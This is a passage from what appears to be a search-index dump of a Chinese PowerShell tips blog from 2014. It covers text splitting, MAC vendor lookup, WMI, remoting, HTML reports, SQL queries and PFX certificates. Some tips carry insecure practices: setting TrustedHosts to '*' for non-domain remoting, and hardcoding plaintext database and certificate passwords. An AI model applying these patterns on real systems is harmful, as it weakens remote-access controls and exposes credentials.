PS&gt; $originalText -split $splitText c: windows test file.txt 我们可以将它保存到一个变量中，然后存取单个的数组元素。 PS&gt; $parts = $originalText -split $splitText PS&gt; $parts[0] c: PS&gt; $parts[-1] file.txt","link":"/2014/09/29/text-splitting/"},{"title":"PowerShell 技能连载 - 高级文本分隔","text":"适用于 PowerShell 所有版本 当您用 -split 操作符来分隔文本时，分隔符本身会被忽略掉： PS&gt; 'Hello, this is a text, and it has commas' -split ',' Hello this is a text and it has commas 如您所见，结果中的逗号被忽略掉了。 分隔符有可能多于一个字符。以下代码将以逗号 + 一个空格作为分隔符： PS&gt; 'Hello, this is a text, and it has commas' -split ', ' Hello this is a text and it has commas 由于 -split 接受的操作数是一个正则表达式，所以以下代码将以逗号 + 至少一个空格作为分隔符： PS&gt; 'Hello, this is a text, and it has commas' -split ',\\s{1,}' Hello this is a text and it has commas 如果您需要的话，可以用 (?=…) 把分隔符包裹起来，以在结果中保留分隔符： PS&gt; 'Hello, this is a text, and it has commas' -split '(?=,\\s{1,})' Hello , this is a text , and it has commas","link":"/2014/09/30/advanced-text-splitting/"},{"title":"PowerShell 技能连载 - 获取 MAC 地址","text":"适用于 PowerShell 所有版本 在 PowerShell 中获取网卡的 MAC 地址十分简单。以下是众多方法中的一个： PS&gt; getmac /FO CSV | ConvertFrom-Csv Physical Address Transport Name ---------------- -------------- 5C-51-4F-62-F2-7D \\Device\\Tcpip_{FF034A81-CBFE-4B11-9D... 5C-51-4F-62-F2-81 Media disconnected 有挑战性的地方在于实际的列名是本地化的，不同语言文化的值差异很大。由于原始信息是来自于 getmac.exe 生成的 CSV 数据，所以有一个简单的技巧：跳过首行（包含 CSV 头部），然后传入自定义的统一列名，以达到对列重命名的效果。 getmac.exe /FO CSV | Select-Object -Skip 1 | ConvertFrom-Csv -Header MAC, Transport 这将总是产生“_MAC_”和“_Transport_”的列。 当然，也有面向对象的解决方案，例如通过 WMI 查询或者使用 Windows 8.1 或 Server 2012/2012 R2。不过，我们认为所演示的方法是一个有趣的选择并且展示了如何将原始的 CSV 数据转换为真正有用的和语言文化无关的信息。","link":"/2014/10/01/getting-mac-addresses/"},{"title":"PowerShell 技能连载 - 通过 MAC 地址识别网卡厂家","text":"适用于 PowerShell 所有版本 每个 MAC 地址唯一标识了一个网络设备。MAC 地址是由网络设备厂家分配的。所以您可以通过任何一个 MAC 地址反查出厂家信息。 您所需的只是一份大约 2MB 大小的 IEEE 厂家清单。以下是下载该清单的脚本： $url = 'http://standards.ieee.org/develop/regauth/oui/oui.txt' $outfile = &quot;$home\\vendorlist.txt&quot; Invoke-WebRequest -Uri $url -OutFile $outfile 下一步，您可以使用该清单来识别厂家信息。首先获取 MAC 地址，例如： PS&gt; getmac Physical Address Transport Name =================== ========================================================== 5C-51-4F-62-F2-7D \\Device\\Tcpip_{FF034A81-CBFE-4B11-9D81-FC8FC889A33C} 5C-51-4F-62-F2-81 Media disconnected 取 MAC 地址的前 3 个 8 进制字符，例如 _5c-51-4f_，然后用它在下载的文件中查询： PS&gt; Get-Content -Path $outfile | Select-String 5c-51-4f -Context 0,6 &gt; 5C-51-4F (hex) Intel Corporate 5C514F (base 16) Intel Corporate Lot 8, Jalan Hi-Tech 2/3 Kulim Hi-Tech Park Kulim Kedah 09000 MALAYSIA 您不仅可以获取厂家名称（这个例子中是 Intel），而且还可以获取厂家的地址和所在区域。","link":"/2014/10/02/identifying-network-vendors-by-mac-address/"},{"title":"PowerShell 技能连载 - 格式化行尾符","text":"适用于 PowerShell 所有版本 当您从 Internet 中下载了文件之后，您也许会遇到文件无法在编辑器中正常打开的情况。最常见的是，由于非正常行尾符导致的。 以下是这个问题的一个例子。在前一个技能里我们演示了如何下载一份 MAC 地址的厂家清单。当下载完成后用记事本打开它时，换行都消失了： $url = 'http://standards.ieee.org/develop/regauth/oui/oui.txt' $outfile = &quot;$home\\vendorlist.txt&quot; Invoke-WebRequest -Uri $url -OutFile $outfile Invoke-Item -Path $outfile 要修复这个文件，只需要使用这段代码： $OldFile = &quot;$home\\vendorlist.txt&quot; $NewFile = &quot;$home\\vendorlistGood.txt&quot; Get-Content $OldFile | Set-Content -Path $NewFile notepad $NewFile Get-Content 能够检测非标准的行尾符，所以结果是各行的字符串数组。当您将这些行写入一个新文件时，一切都会变正常，因为 Set-Content 会使用缺省的行尾符。","link":"/2014/10/03/normalizing-line-endings/"},{"title":"PowerShell 技能连载 - 重命名变量","text":"适用于 PowerShell ISE 3 或更高版本 以下是一个简单的变量重命名函数，您可以在 PowerShell 3.0 及以上版本的 ISE 编辑器中使用它 它将识别某个变量的所有实例，然后将它重命名为一个新的名字。 function Rename-Variable { param ( [Parameter(Mandatory=$true)] $OldName, [Parameter(Mandatory=$true)] $NewName ) $InputText = $psise.CurrentFile.Editor.Text $token = $null $errors = $null $ast = [System.Management.Automation.Language.Parser]::ParseInput($InputText, [ref] $token, [ref] $errors) $token | Where-Object { $_.Kind -eq 'Variable'} | Where-Object { $_.Name -eq $OldName } | Sort-Object { $_.Extent.StartOffset } -Descending | ForEach-Object { $start = $_.Extent.StartOffset + 1 $end = $_.Extent.EndOffset $InputText = $InputText.Remove($start, $end-$start).Insert($start, $NewName) } $psise.CurrentFile.Editor.Text = $InputText } 运行这个函数之后，您将得到一个名为 Rename-Variable 的新命令。 下一步，在 ISE 编辑器中打开一个脚本，然后在控制台面板中，键入以下内容（当然，需要将旧的变量名“_oldVariableName_”改为您当前所打开的 ISE 脚本中实际存在的变量名）。 PS&gt; Rename-Variable -OldName oldVariableName -NewName theNEWname 立刻，旧变量的所有出现的地方都被替换成新的变量名。 注意：这是一个非常简易的变量重命名函数。一定要记得备份您的脚本。它还不能算是一个能用在生产环境的重构方案。 当您重命名变量时，您脚本的许多别处地方也可能需要更新。例如，当一个变量是函数参数时，所有调用该函数的地方都得修改它们的参数名。","link":"/2014/10/06/renaming-variables/"},{"title":"PowerShell 技能连载 - 获取变量详细清单","text":"适用于 PowerShell ISE 3 或更高版本 出于写文档等目的，您可能需要获得一份 PowerShell 脚本用到的所有变量的清单。 以下是一个名为 Get-Variable 的函数： function Get-Variable { $token = $null $errors = $null $ast = [System.Management.Automation.Language.Parser]::ParseInput($psise.CurrentFile.Editor.Text, [ref] $token, [ref] $errors) # not complete, add variables you want to exclude from the list: $systemVariables = '_', 'null', 'psitem', 'true', 'false', 'args', 'host' $null = $ast.FindAll({ $args[0] -is [System.Management.Automation.Language.CommandAst] }, $true) $token | Where-Object { $_.Kind -eq 'Variable'} | Select-Object -ExpandProperty Name | Where-Object { $systemVariables -notcontains $_ } | Sort-Object -Unique } 只需要用系统自带的 ISE 编辑器打开这个脚本，然后在交互式控制台中运行 Get-Variable。 您将会得到一个排序过的列表，内容是当前打开的脚本用到的所有变量。 如果您将“$psise.CurrentFile.Editor.Text”替换成一个包含脚本代码的变量，那么您可以在 ISE 编辑器之外运行这个函数。只需要用 Get-Content 将任意脚本的内容读取进一个变量，然后就可以在上述代码中使用这个变量。","link":"/2014/10/07/getting-a-variable-inventory/"},{"title":"PowerShell 技能连载 - 查找可改变的属性","text":"适用于 PowerShell 所有版本 当您从 PowerShell cmdlet 中获取结果时，返回的结果都是包含属性的对象。有些属性是可改变的，另一些是只读的。 以下是一个获取可改变的属性的简单技巧。这段代码是以当前 PowerShell 宿主的进程对象为例，但您可以用任意的 cmdlet 结果。 $myProcess = Get-Process -Id $Pid $myProcess | Get-Member -MemberType Properties | Out-String -Stream | Where-Object { $_ -like '*set;*' } 结果类似如下： EnableRaisingEvents Property bool EnableRaisingEvents {get;set;} MaxWorkingSet Property System.IntPtr MaxWorkingSet {get;set;} MinWorkingSet Property System.IntPtr MinWorkingSet {get;set;} PriorityBoostEnabled Property bool PriorityBoostEnabled {get;set;}","link":"/2014/10/08/finding-changeable-properties/"},{"title":"PowerShell 技能连载 - 查找文件以及错误信息","text":"适用于 PowerShell 所有版本 当您使用 Get-ChildItem 在目录中递归查找文件时，您有时候会遇到一些权限不足的文件夹。为了禁止错误信息，您可能会使用 -ErrorAction SilentlyContinue 的方法。 这是个不错的实践，但是您也许还希望得到一份权限不足的文件夹的清单。 以下是一段在 Windows 文件夹中搜索所有 PowerShell 脚本的脚本。它将这些文件保存在 $PSScripts 变量中。同时，它将所有的错误信息记录在 $ErrorList 变量中，并列出所有不可存取的文件夹。 $PSScripts = Get-ChildItem -Path c:\\windows -Filter *.ps1 -Recurse -ErrorAction SilentlyContinue -ErrorVariable ErrorList $ErrorList | ForEach-Object { Write-Warning ('Access denied: ' + $_.CategoryInfo.TargetName) }","link":"/2014/10/09/finding-files-plus-errors/"},{"title":"PowerShell 技能连载 - 获取包含数据类型信息在内的注册表键值","text":"适用于 PowerShell 所有版本 读取所有注册表信息时，如果您不需要数据类型信息，那么十分简单：只需要用 Get-ItemProperty 即可： Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 如果您确实需要数据类新信息，那么需要做点额外的事情： $key = Get-Item -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run $key.GetValueNames() | ForEach-Object { $ValueName = $_ $rv = 1 | Select-Object -Property Name, Type, Value $rv.Name = $ValueName $rv.Type = $key.GetValueKind($ValueName) $rv.Value = $key.GetValue($ValueName) $rv }","link":"/2014/10/10/reading-registry-values-with-type/"},{"title":"在 PowerShell 中利用正则表达式来解析文本块","text":"需求给定一段文本，如： 1, abcd [xxxx] vkjl gas kje asld gew wef 2, bbb [wefs] oioias wmfjalkjs 3, ccc [wegas] kzxlj kjlwiewe ii 要求分割成多段以数字开头的文本块，如： 第一块： 1, abcd [xxxx] vkjl gas kje asld gew wef 第二块： 2, bbb [wefs] oioias wmfjalkjs 第三块： 3, ccc [wegas] kzxlj kjlwiewe ii 思路 定义我们要东西为 n 个“block”。 每个“block”的特征是： 以数字开头 block 之前可能是整段文本的起始也有可能是一个回车符。 block 之后可能是一个回车符+下一行的数字也有可能是整段文本的结束。 block 之前和之后的回车符是不需要的 block 应该尽可能“非贪婪”，遇到下一个符合条件的，算作一个新的 block 开始。 其中，“block 之前和之后的回车符是不需要的”可以用正则表达式的“零宽断言”来解决。 代码$subject = @' 1, abcd [xxxx] vkjl gas kje asld gew wef 2, bbb [wefs] oioias wmfjalkjs 3, ccc [wegas] kzxlj kjlwiewe ii '@ $resultlist = new-object System.Collections.Specialized.StringCollection $regex = [regex]@' (?snx)(^|(?&lt;=\\n)) (?&lt;block&gt;\\d, .*?) ((?=\\n\\d, )|$) '@ $match = $regex.Match($subject) while ($match.Success) { $resultlist.Add($match.Groups['block'].Value) | out-null $match = $match.NextMatch() } $resultlist | ForEach-Object { echo $_ echo --- } 输出结果1, abcd [xxxx] vkjl gas kje asld gew wef --- 2, bbb [wefs] oioias wmfjalkjs --- 3, ccc [wegas] kzxlj kjlwiewe ii ---","link":"/2014/10/11/Use-Regular-Expression-to-Extract-Text-Blocks-in-PowerShell/"},{"title":"PowerShell 技能连载 - 获取美国邮政编码","text":"适用于 PowerShell 所有版本 是否曾需要查找某个（美国）城市的邮政编码，或者反过来通过邮政编码查找城市的名称？ 只需要简单地用 PowerShell 连接到一个免费的 Web Service 就可以获得这些信息： $webservice = New-WebServiceProxy -Uri 'http://www.webservicex.net/uszip.asmx?WSDL' $webservice.GetInfoByCity('New York').Table $webservice.GetInfoByZIP('10286').Table","link":"/2014/10/13/getting-us-zip-codes/"},{"title":"PowerShell 技能连载 - 列出所有信息","text":"适用于 PowerShell 所有版本 大多数时候，PowerShell 不会显示从 cmdlet 中返回的所有信息。相反地，PowerShell 限制了只显示信息中最常见的部分。 PS&gt; Get-WmiObject -Class CIM_CacheMemory BlockSize : 1024 CacheSpeed : CacheType : 4 DeviceID : Cache Memory 0 InstalledSize : 32 Level : 3 MaxCacheSize : 32 NumberOfBlocks : 32 Status : OK (...) 要看到完整的信息，请像这样加一句 Select-Object 语句： PS&gt; Get-WmiObject -Class CIM_CacheMemory | Select-Object -Property * PSComputerName : TOBI2 DeviceID : Cache Memory 0 ErrorCorrectType : 5 Availability : 3 Status : OK StatusInfo : 3 BlockSize : 1024 CacheSpeed : CacheType : 4 InstalledSize : 32 Level : 3 MaxCacheSize : 32 NumberOfBlocks : 32 WritePolicy : 3 __GENUS : 2 __CLASS : Win32_CacheMemory __SUPERCLASS : CIM_CacheMemory __DYNASTY : CIM_ManagedSystemElement __RELPATH : Win32_CacheMemory.DeviceID=&quot;Cache Memory 0&quot; __PROPERTY_COUNT : 53 __DERIVATION : {CIM_CacheMemory, CIM_Memory, CIM_StorageExtent, CIM_LogicalDevice...} __SERVER : TOBI2 __NAMESPACE : root\\cimv2 __PATH : \\\\TOBI2\\root\\cimv2:Win32_CacheMemory.DeviceID=&quot;Cache Memory 0&quot; Access : AdditionalErrorData : Associativity : 7 Caption : Cache Memory ConfigManagerErrorCode : ConfigManagerUserConfig : CorrectableError : CreationClassName : Win32_CacheMemory CurrentSRAM : {5} Description : Cache Memory EndingAddress : ErrorAccess : ErrorAddress : ErrorCleared : ErrorData : ErrorDataOrder : ErrorDescription : ErrorInfo : ErrorMethodology : ErrorResolution : ErrorTime : ErrorTransferSize : FlushTimer : InstallDate : LastErrorCode : LineSize : Location : 0 Name : Cache Memory OtherErrorDescription : PNPDeviceID : PowerManagementCapabilities : PowerManagementSupported : Purpose : L1 Cache ReadPolicy : ReplacementPolicy : StartingAddress : SupportedSRAM : {5} SystemCreationClassName : Win32_ComputerSystem SystemLevelAddress : SystemName : TOBI2 Scope : System.Management.ManagementScope Path : \\\\TOBI2\\root\\cimv2:Win32_CacheMemory.DeviceID=&quot;Cache Memory 0&quot; Options : System.Management.ObjectGetOptions ClassPath : \\\\TOBI2\\root\\cimv2:Win32_CacheMemory Properties : {Access, AdditionalErrorData, Associativity, Availability...} SystemProperties : {__GENUS, __CLASS, __SUPERCLASS, __DYNASTY...} Qualifiers : {dynamic, Locale, provider, UUID} Site : Container : (...)","link":"/2014/10/14/list-all-information/"},{"title":"PowerShell 技能连载 - WMI 搜索工具","text":"适用于 PowerShell 所有版本 WMI 是一个很棒很强大的技术：只需要指定一个 WMI 类名，您就可以获取该类的所有实体。 PS&gt; Get-WmiObject -Class Win32_BIOS SMBIOSBIOSVersion : 76CN27WW Manufacturer : LENOVO Name : 76CN27WW SerialNumber : 1006250300406 Version : LENOVO - 1 那么如何知道有哪些 WMI 类呢？以下是一个搜索工具函数： function Find-WMIClass { param ( [Parameter(Mandatory=$true)] $SearchTerm = 'Resolution' ) Get-WmiObject -Class * -List | Where-Object { $_.Properties.Count -ge 3 } | Where-Object { $_.Name -notlike 'Win32_Perf*' } | Where-Object { $ListOfNames = $_.Properties | Select-Object -ExpandProperty Name ($ListOfNames -like &quot;*$SearchTerm*&quot;) -ne $null } | Sort-Object -Property Name } 只需要指定一个搜索条件。该函数将会查找所有属性名中包含搜索条件的 WMI 类（可以用通配符来扩大搜索范围）。 这段代码能搜索属性以“resolution”结尾的 WMI 类： PS&gt; Find-WMIClass -SearchTerm *resolution NameSpace: ROOT\\cimv2 Name Methods Properties ---- ------- ---------- CIM_CacheMemory {SetPowerState, R... {Access, AdditionalErr... CIM_CurrentSensor {SetPowerState, R... {Accuracy, Availabilit... CIM_FlatPanel {SetPowerState, R... {Availability, Caption... CIM_Memory {SetPowerState, R... {Access, AdditionalErr... CIM_MonitorResolution {} {Caption, Description,... CIM_NonVolatileStorage {SetPowerState, R... {Access, AdditionalErr... CIM_NumericSensor {SetPowerState, R... {Accuracy, Availabilit... CIM_PCVideoController {SetPowerState, R... {AcceleratorCapabiliti... CIM_PointingDevice {SetPowerState, R... {Availability, Caption... CIM_Printer {SetPowerState, R... {Availability, Availab... CIM_Tachometer {SetPowerState, R... {Accuracy, Availabilit... CIM_TemperatureSensor {SetPowerState, R... {Accuracy, Availabilit... CIM_VideoController {SetPowerState, R... {AcceleratorCapabiliti... CIM_VideoControllerResolution {} {Caption, Description,... CIM_VolatileStorage {SetPowerState, R... {Access, AdditionalErr... CIM_VoltageSensor {SetPowerState, R... {Accuracy, Availabilit... Win32_CacheMemory {SetPowerState, R... {Access, AdditionalErr... Win32_CurrentProbe {SetPowerState, R... {Accuracy, Availabilit... Win32_DisplayControllerConfigura... {} {BitsPerPixel, Caption... Win32_MemoryArray {SetPowerState, R... {Access, AdditionalErr... Win32_MemoryDevice {SetPowerState, R... {Access, AdditionalErr... Win32_NetworkAdapterConfiguration {EnableDHCP, Rene... {ArpAlwaysSourceRoute,... Win32_PointingDevice {SetPowerState, R... {Availability, Caption... Win32_Printer {SetPowerState, R... {Attributes, Availabil... Win32_PrinterConfiguration {} {BitsPerPel, Caption, ... Win32_SMBIOSMemory {SetPowerState, R... {Access, AdditionalErr... Win32_TemperatureProbe {SetPowerState, R... {Accuracy, Availabilit... Win32_VideoConfiguration {} {ActualColorResolution... Win32_VideoController {SetPowerState, R... {AcceleratorCapabiliti... Win32_VoltageProbe {SetPowerState, R... {Accuracy, Availabilit... 下一步，选择一个类名并观察它的实际数据： PS&gt; Get-WmiObject -Class CIM_CacheMemory | Select-Object -Property *","link":"/2014/10/15/wmi-search-tool/"},{"title":"PowerShell 技能连载 - 从文件中读取系统日志","text":"适用于 PowerShell 所有版本 有些时候，您可能会需要读取已经导出到磁盘上的系统日志文件，或者您希望直接从一个“evtx”格式的文件中读取系统日志。 以下是实现的方法： $path = &quot;$env:windir\\System32\\Winevt\\Logs\\Setup.evtx&quot; Get-WinEvent -Path $path","link":"/2014/10/16/reading-system-logs-from-file/"},{"title":"PowerShell 技能连载 - 启用、禁用 PowerShell 远程操作","text":"适用于 PowerShell 3.0 及更高版本 如果您想通过 PowerShell 访问一台远程计算机，那么在目标机器（您想访问的机器）上，以管理员身份运行这行代码： PS&gt; Enable-PSRemoting -SkipNetworkProfileCheck -Force 执行完之后，您就可以通过别的计算机访问该计算机了——假设您拥有目标机器的管理员权限，您需要指定计算机名而不是它的 IP 地址，并且两台机器都需要在同一个域中。 要交互式地连接目标机器，使用这行代码： PS&gt; Enter-PSSession -ComputerName targetComputerName 要在远程计算机上运行代码，请使用这种方式： PS&gt; Invoke-Command -ScriptBlock { Get-Service } -ComputerName targetComputerName","link":"/2014/10/17/enabling-and-disabling-powershell-remoting/"},{"title":"PowerShell 技能连载 - 在非域环境中使用 PowerShell 远程操作","text":"适用于 PowerShell 3.0 及以上版本 缺省情况下，当您通过 Enable-PSRemoting 来启用 PowerShell 远程操作时，只启用了 Kerberos 身份验证。这要求双方主机处于同一个域（或信任的域）中，并且仅能通过计算机名访问（很可能包括域名前缀）。它无法跨域、通过域之外的机器，或通过 IP 地址来访问。 要达到上述目的，您需要在启用远程操作的机器上做一些调整。在初始化连接的机器上以管理员权限运行 PowerShell 控制台，键入以下代码： PS&gt; Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force 如果该路径不可用，您可能需要在该机器上（临时地）启用 PowerShell 远程操作（用 Enable-PSRemoting –SkipNetworkProfileCheck –Force）。 当您做了上述改动以后，就可以支持 NTLM 验证了。只需要记住从现在开始，要访问加入域的计算机，您需要通过 -Credential 参数提交用户名和密码。","link":"/2014/10/20/using-powershell-remoting-without-domain/"},{"title":"获取所有支持管道的 Cmdlet","text":"用这段代码可以获取所有支持管道的 PowerShell 命令： Get-Command -CommandType Cmdlet | Where-Object { $_.Parameters.Values | Where-Object { $_.Attributes.ValueFromPipeline } }","link":"/2014/10/21/List-Cmdlets-Support-Pipeline/"},{"title":"PowerShell 技能连载 - 创建新对象","text":"适用于 PowerShell 3.0 或以上版本 这是一个创建自定义对象的简单有效的方法： $object = [PSCustomObject]@{ Name = 'Weltner' ID = 123 Active = $true } 这将创建一个包含预设属性值的完整功能的 PowerShell 对象： PS&gt; $object Name ID Active ---- -- ------ Weltner 123 True PS&gt; $object.Name Weltner PS&gt; $object.Active True PS&gt;","link":"/2014/10/21/creating-newobjects/"},{"title":"PowerShell 技能连载 - 伪造对象类型","text":"适用于 PowerShell 3.0 及以上版本 PowerShell 内部的类型扩展系统的作用是负责将对象转换为文本。它的实现方法是通过查询一个名为“PSTypeName”的属性。您可以为自定义的对象添加这个属性来模拟其它对象类型并使 ETS 用相同方式显示该对象： $object = [PSCustomObject]@{ ProcessName = 'notepad' ID = -1 PSTypeName = 'System.Diagnostics.Process' } The object pretends to be a process object, and ETS will format it accordingly: PS&gt; $object Handles NPM(K) PM(K) WS(K) VM(M) CPU(s) Id ProcessName ------- ------ ----- ----- ----- ------ -- ----------- 0 0 0 0 -1 notepad PS&gt;","link":"/2014/10/22/faking-object-type/"},{"title":"PowerShell 技能连载 - 控制可执行文件的执行","text":"适用于 PowerShell 所有版本 PowerShell 将所有可执行程序（扩展名为 EXE 的文件）视为普通的命令。您甚至可以限制 PowerShell 不能执行任何可执行程序或只能执行白名单内的程序。 缺省的设置是允许任何 EXE 执行： PS&gt; $ExecutionContext.SessionState.Applications * 该设置为仅允许 ping.exe 和 regedit.exe 执行： $ExecutionContext.SessionState.Applications.Clear() $ExecutionContext.SessionState.Applications.Add('ping.exe') $ExecutionContext.SessionState.Applications.Add('regedit.exe') 以下是结果： PS&gt; $ExecutionContext.SessionState.Applications ping.exe regedit.exe 显然地，您可以轻松地将设置恢复到缺省状态： PS&gt; $ExecutionContext.SessionState.Applications.Add('*') PS&gt; explorer PS&gt; 所以，该设置可以使执行 EXE 程序变得更困难（或者说防止不小心运行了不该运行的 EXE）。若真要将它作为安全策略，您还需要关闭所谓的“语言模式”。 当语言模式关闭时，您无法直接存取 .NET 对象。这意味着您无法在当前的 PowerShell 会话中回退该操作。我们将在明天详细介绍语言模式设置。","link":"/2014/10/23/controlling-execution-of-executables/"},{"title":"PowerShell 技能连载 - 关闭“完整语言”模式","text":"适用于 PowerShell 所有版本 PowerShell 可以有多种方法作出限制。一种是将语言模式从 FullLanguage 改为 RestrictedLanguage。这是一种无法撤销的方法，最坏可以关闭并重开 PowerShell： $host.Runspace.SessionStateProxy.LanguageMode = 'RestrictedLanguage' 一旦设置成 RestrictedLanguage，PowerShell 将只能执行指令。它将再也无法执行对象的方法或存取对象的属性，并且您也无法定义新的函数。 所以 RestrictedLanguage 基本上是一个安全的锁，锁定以后 PowerShell 只能执行指令但无法深入到底层的 .NET 或用新创建的函数覆盖现有的命令。","link":"/2014/10/24/turning-off-fulllanguage-mode/"},{"title":"PowerShell 技能连载 - 创建彩色的 HTML 报告","text":"适用于 PowerShell 所有版本 要将结果转换为彩色的自定义报告，只需要定义三个脚本块：一个生成 HTML 文档的头部，另一个生成尾部，还有一个对报表中的列表做循环，针对每一个列表项做处理。 然后，将这些脚本块传递给 ForEach-Object。它接受一个 begin、一个 process 和一个 end 脚本块。 以下是一个示例代码，演示了如何创建一个彩色的服务状态报表： $path = &quot;$env:temp\\report.hta&quot; $beginning = { @' &lt;html&gt; &lt;head&gt; &lt;title&gt;Report&lt;/title&gt; &lt;STYLE type=&quot;text/css&quot;&gt; h1 {font-family:SegoeUI, sans-serif; font-size:20} th {font-family:SegoeUI, sans-serif; font-size:15} td {font-family:Consolas, sans-serif; font-size:12} &lt;/STYLE&gt; &lt;/head&gt; &lt;image src=&quot;http://www.yourcompany.com/yourlogo.gif&quot; /&gt; &lt;h1&gt;System Report&lt;/h1&gt; &lt;table&gt; &lt;tr&gt;&lt;th&gt;Status&lt;/th&gt;&lt;th&gt;Name&lt;/th&gt;&lt;/tr&gt; '@ } $process = { $status = $_.Status $name = $_.DisplayName if ($status -eq 'Running') { '&lt;tr&gt;' '&lt;td bgcolor=&quot;#00FF00&quot;&gt;{0}&lt;/td&gt;' -f $status '&lt;td bgcolor=&quot;#00FF00&quot;&gt;{0}&lt;/td&gt;' -f $name '&lt;/tr&gt;' } else { '&lt;tr&gt;' '&lt;td bgcolor=&quot;#FF0000&quot;&gt;{0}&lt;/td&gt;' -f $status '&lt;td bgcolor=&quot;#FF0000&quot;&gt;{0}&lt;/td&gt;' -f $name '&lt;/tr&gt;' } } $end = { @' &lt;/table&gt; &lt;/html&gt; &lt;/body&gt; '@ } Get-Service | ForEach-Object -Begin $beginning -Process $process -End $end | Out-File -FilePath $path -Encoding utf8 Invoke-Item -Path $path","link":"/2014/10/27/creating-colorful-html-reports/"},{"title":"AngularJS 中 $scope 的原型继承问题","text":"问题描述如下 AngularJS 代码的 INPUT 中键入“Separate reality”，执行效果是什么？ 12var HelloCtrl = function ($scope) {}; 1234567&lt;body ng-app ng-init=&quot;name='World'&quot;&gt; &lt;h1&gt;Hello, {{name}}&lt;/h1&gt; &lt;div ng-controller=&quot;HelloCtrl&quot;&gt; Say hello to: &lt;input type=&quot;text&quot; ng-model=&quot;name&quot;&gt; &lt;h2&gt;Hello, {{name}}!&lt;/h2&gt; &lt;/div&gt;&lt;/body&gt; 执行结果 外层 H1 始终显示 World 内层 H2 先显示 World在 INPUT 中键入之后，H2 显示“Separate reality”。 原因ng-controller 创建了一个新的 Scope，该作用域原型继承于父 Scope。 解决方案方案 1 - 采用 $parent 访问父作用域这种方法带导致强耦合，不提倡！ 1&lt;input type=&quot;text&quot; ng-model=&quot;$parent.name&quot;&gt; 方案 2 - 绑定到对象的属性最佳实践！ 1234567&lt;body ng-app ng-init=&quot;thing = {name : 'World'}&quot;&gt; &lt;h1&gt;Hello, {{thing.name}}&lt;/h1&gt; &lt;div ng-controller=&quot;HelloCtrl&quot;&gt; Say hello to: &lt;input type=&quot;text&quot; ng-model=&quot; thing.name&quot;&gt; &lt;h2&gt;Hello, {{thing.name}}!&lt;/h2&gt; &lt;/div&gt;&lt;/body&gt; 模拟以下例子模拟了原始问题 vs 解决方案 2。 1234567891011121314151617181920var a = { x: 1, y: { z: 2 }};var b = {};b.__proto__ = a;console.log(b.x); // 1console.log(b.y.z); // 2// 原始问题b.x = 11; // 模拟在 INPUT 中输入console.log(a.x); // 1// 解决方案 2b.y.z = 22; // 模拟在 INPUT 中输入console.log(a.y.z); // 22","link":"/2014/10/28/Scope-Inheritance-in-AngularJS/"},{"title":"PowerShell 技能连载 - 存取 SQLServer 数据库","text":"适用于 PowerShell 所有版本及 SQLServer 您在使用 SQL Server 吗？以下是一段可以进行 SQL 查询并获取数据的 PowerShell 脚本模板。只需要确保填写了正确的用户信息、服务器地址和 SQL 语句即可： $Database = 'Name_Of_SQLDatabase' $Server = '192.168.100.200' $UserName = 'DatabaseUserName' $Password = 'SecretPassword' $SqlQuery = 'Select * FROM TestTable' # Accessing Data Base $SqlConnection = New-Object -TypeName System.Data.SqlClient.SqlConnection $SqlConnection.ConnectionString = &quot;Data Source=$Server;Initial Catalog=$Database;user id=$UserName;pwd=$Password&quot; $SqlCmd = New-Object System.Data.SqlClient.SqlCommand $SqlCmd.CommandText = $SqlQuery $SqlCmd.Connection = $SqlConnection $SqlAdapter = New-Object System.Data.SqlClient.SqlDataAdapter $SqlAdapter.SelectCommand = $SqlCmd $set = New-Object data.dataset # Filling Dataset $SqlAdapter.Fill($set) # Consuming Data $Path = &quot;$env:temp\\report.hta&quot; $set.Tables[0] | ConvertTo-Html | Out-File -FilePath $Path Invoke-Item -Path $Path","link":"/2014/10/28/accessing-sqlserver-database/"},{"title":"PowerShell 技能连载 - 读取 PFX 证书","text":"适用于 PowerShell 所有版本 当您使用 Get-PfxCertificate 命令时，您可以读取 PFX 证书文件，并使用证书来为脚本签名。然而，该命令总是交互式地询问证书的密码。 以下这段代码可以通过脚本来提交密码： $PathToPfxFile = 'C:\\temp\\test.pfx' $PFXPassword = 'test' Add-Type -AssemblyName System.Security $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 $cert.Import($PathToPfxFile, $PFXPassword, 'Exportable') $cert","link":"/2014/10/29/reading-in-pfx-certificate/"},{"title":"PowerShell 技能连载 - 改变 PowerShell 的优先级","text":"适用于 PowerShell 所有版本 也许您有时候希望 PowerShell 脚本在后台运行，例如复制文件时，但又不希望脚本抢占过多 CPU 或干预其它任务。 一种减慢 PowerShell 脚本运行速度的方法是降低它们的优先级。以下是一个实现该效果的函数： function Set-Priority { [CmdletBinding()] param ( [Parameter(Mandatory=$true)] [System.Diagnostics.ProcessPriorityClass] $Priority ) $process = Get-Process -Id $pid $process.PriorityClass = $Priority } 要降低脚本的优先级，请这样调用： Set-Priority -Priority BelowNormal 您可以稍后将优先级调回 Normal，甚至可以调高优先级使脚本获得更多资源执行。例如需要执行更重的任务，不过这会使 UI 响应性变得更差。","link":"/2014/10/30/changing-powershell-priority/"},{"title":"PowerShell 技能连载 - 创建新的共享文件夹","text":"适用于 PowerShell 所有版本 WMI 可以方便地创建新的共享文件夹。以下是一段创建本地共享文件夹的代码： $ShareName = 'NewShare' $Path = 'c:\\123' If (!(Get-WmiObject -Class Win32_Share -Filter &quot;name='$ShareName'&quot;)) { $Shares=[WMICLASS]&quot;WIN32_Share&quot; $Shares.Create($Path,$ShareName,0).ReturnValue } else { Write-Warning &quot;Share $ShareName exists already.&quot; } 如果您有远程机器的管理员权限的话，也可以在远程的机器上创建共享文件夹。只需要像这样使用完整 WMI 即可： $ShareName = 'NewShare' $Path = 'c:\\123' $Server = 'MyServer' If (!(Get-WmiObject -Class Win32_Share -Filter &quot;name='$ShareName'&quot;)) { $Shares=[WMICLASS]&quot;\\\\$Server\\root\\cimv2:WIN32_Share&quot; $Shares.Create($Path,$ShareName,0).ReturnValue } else { Write-Warning &quot;Share $ShareName exists already.&quot; }","link":"/2014/10/31/creating-newshares/"},{"title":"PowerShell 技能连载 - 调用记事本打印文本","text":"适用于 PowerShell 所有版本 若要调用记事本打印纯文本文件，请使用这行代码（请将路径替换成需要的值，否则将打印出长长的系统日志文件）： Start-Process -FilePath notepad -ArgumentList '/P 